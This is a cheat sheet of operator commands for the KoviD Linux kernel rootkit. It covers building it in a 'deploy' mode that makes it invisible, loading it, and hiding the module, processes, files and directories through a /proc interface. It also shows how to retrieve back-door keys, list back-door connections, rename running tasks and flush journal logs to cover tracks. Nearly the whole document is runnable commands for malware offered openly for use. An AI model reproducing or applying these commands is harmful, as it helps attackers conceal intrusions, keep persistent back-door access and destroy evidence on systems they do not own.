# CheatSheet

## Set PROCNAME

*Action:* build

*Mode:* debug,release

*About:* Set `example` as proc UI: `/proc/example`

*Root required:* No

*Commands:*
- `export PROCNAME=example`


## Compile KoviD

*Action:* build

*Mode:* debug

*About:* Logs go to `dmesg` output, rootkit is visible by default.

*Root required:* No

*Commands:*
- `make`


## Compile KoviD in DEPLOY mode

*Action:* build

*Mode:* deploy

*About:* No logs to `dmesg`, rootkit is invisible.

*Root required:* No

*Commands:*
- `DEPLOY=1 make`


## Build Inject loader

*Action:* build

*Mode:* deploy

*About:* Build `inject/` loaders.

*Root required:* No

*Commands:*
- `DEPLOY=1 make`
- `make strip`
- `make -C inject/`


## Load and Unload KoviD

*Action:* run

*Mode:* debug,deploy

*About:* load module, unload module

*Root required:* Yes

*Commands:*
- `sudo insmod ./kovid.ko`
- `sudo rmmod ./kovid.ko`


## proc UI visibility

*Action:* run

*Mode:* debug,deploy

*About:* to switch proc UI on/off repeat command

*Root required:* No

*Commands:*
- `kill -CONT 31337`


## KoviD invisibility

*Action:* run

*Mode:* debug

*About:* hide module

*Root required:* No

*Commands:*
- `echo hide-lkm >/proc/example`
- `cat /proc/example`


## KoviD visibility

*Action:* run

*Mode:* debug

*About:* unhide module

*Root required:* No

*Commands:*
- `echo get-unhidekey >/proc/example`
- `key=$(cat /proc/example)`
- `echo unhide-lkm=$key > /proc/example`


## KoviD visibility in DEPLOY mode

*Action:* run

*Mode:* deploy

*About:* unhide module, KEY is build-time generated, check Makefile output

*Root required:* Yes

*Commands:*
- `echo unhide-lkm=<KEY> > /proc/example`


## Unload KoviD

*Action:* run

*Mode:* debug

*About:* unload module

*Root required:* No

*Commands:*
- `sudo rmmod ./kovid.ko`


## Unload KoviD in DEPLOY mode

*Action:* run

*Mode:* deploy

*About:* unload module AFTER `unhide-lkm` command

*Root required:* Yes

*Commands:*
- `sudo rmmod -f ./kovid.ko`


## Get unhide module KEY

*Action:* UI

*Mode:* debug

*About:* get unhide module KEY

*Root required:* No

*Commands:*
- `echo get-unhidekey >/proc/example`
- `cat /proc/example`


## Get back-doors KEY

*Action:* UI

*Mode:* debug

*About:* get back-door KEY

*Root required:* No

*Commands:*
- `echo get-bdkey >/proc/example`
- `cat /proc/example`


## get back-door KEY

*Action:* UI

*Mode:* debug

*About:* get back-door KEY

*Root required:* No

*Commands:*
- `echo get-bdkey >/proc/example`
- `cat /proc/example`


## Hide process (PID)

*Action:* UI

*Mode:* debug,release

*About:* to hide/unhide PID 1234, repeat command

*Root required:* debug=No, release=Yes

*Commands:*
- `echo 1234 >/proc/example`


## Hide a file in current directory

*Action:* UI

*Mode:* debug,release

*About:* Hide a file

*Root required:* debug=No, release=Yes

*Commands:*
- `echo hide-file=README.txt >/proc/example`


## Hide a file elsewhere

*Action:* UI

*Mode:* debug,release

*About:* Hide a file

*Root required:* debug=No, release=Yes

*Commands:*
- `echo hide-file=/home/user/README.txt >/proc/example`


## Hide all instances of a file

*Action:* UI

*Mode:* debug,release

*About:* Hide a file

*Root required:* debug=No, release=Yes

*Commands:*
- `echo hide-file-anywhere=README.txt >/proc/example`


## Hide a directory in current directory

*Action:* UI

*Mode:* debug,release

*About:* Hide a file

*Root required:* debug=No, release=Yes

*Commands:*
- `echo hide-directory=dir1 >/proc/example`


## Hide a directory elsewhere

*Action:* UI

*Mode:* debug,release

*About:* Unhide a directory

*Root required:* debug=No, release=Yes

*Commands:*
- `echo hide-directory=/home/some-user/dir1 >/proc/example`


## Unhide a directory

*Action:* UI

*Mode:* debug,release

*About:* Hide a directory

*Root required:* debug=No, release=Yes

*Commands:*
- `echo unhide-directory=dir1 >/proc/example`


## List hidden files

*Action:* UI

*Mode:* debug

*About:* Show hidden filenames in `dmesg`

*Root required:* No

*Commands:*
- `echo list-hidden-files >/proc/example`
- `dmesg`


## Rename a running task

*Action:* UI

*Mode:* debug,release

*About:* Rename PID 1234 task to `newtaskname`

*Root required:* debug=No, release=Yes

*Commands:*
- `echo rename-task=1234,newtaskname >/proc/example`


## List hidden tasks (PIDs)

*Action:* UI

*Mode:* debug

*About:* Show hidden tasks in `dmesg`

*Root required:* No

*Commands:*
- `echo list-hidden-tasks >/proc/example`
- `dmesg`


## List current back-door connections

*Action:* UI

*Mode:* debug

*About:* Show current back-door connections in `dmesg`

*Root required:* No

*Commands:*
- `echo list-backdoor >/proc/example`
- `dmesg`


## Get the base-address of a process PID

*Action:* UI

*Mode:* debug,release

*About:* Fetch process base-address of PID 1234

*Root required:* debug=No, release=Yes

*Commands:*
- `echo base-address=1234 >/proc/example`
- `cat /proc/example`


## Run journal flush

*Action:* UI

*Mode:* debug,release

*About:* flush journal logs

*Root required:* debug=No, release=Yes

*Commands:*
- `echo journal-flush >/proc/example`

